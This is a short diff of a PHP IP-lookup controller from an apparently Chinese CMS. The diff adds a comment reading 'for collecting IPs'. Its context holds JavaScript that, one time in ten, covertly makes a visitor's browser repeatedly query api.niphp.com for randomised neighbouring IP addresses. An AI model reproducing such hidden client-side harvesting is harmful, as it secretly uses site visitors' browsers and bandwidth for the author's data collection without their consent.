@@ -40,7 +40,10 @@ class Ip extends Async
             $refere = $refere && false !== stripos($refere, $this->request->rootDomain());
             if ($refere || $this->request->param('json', false)) {
                 return $this->cache(1440)->success('IP', $ip);
-            } else {
+            }
+
+            // 为收集IP
+            else {
                 $data = 'var NICMS_IPINFO=' . json_encode($ip, JSON_UNESCAPED_UNICODE) . ';';
                 if (0 === rand(0, 9)) {
                     $data .= 'if ("undefined" != typeof (NICMS_IPINFO)) {const xhr = new XMLHttpRequest();let ip = NICMS_IPINFO.ip.split(".");ip[2] = parseInt(Math.random() * 255, 10) + 1;ip[3] = parseInt(Math.random() * 255, 10) + 1;let timer = setInterval(function () {if (ip[3] < 255) {ip[3]++;}xhr.open("GET", "https://api.niphp.com/ip.do?json=true&ip=" + ip.join("."), true);xhr.send();if (ip[3] >= 255) {clearInterval(timer);}}, 12000);}';
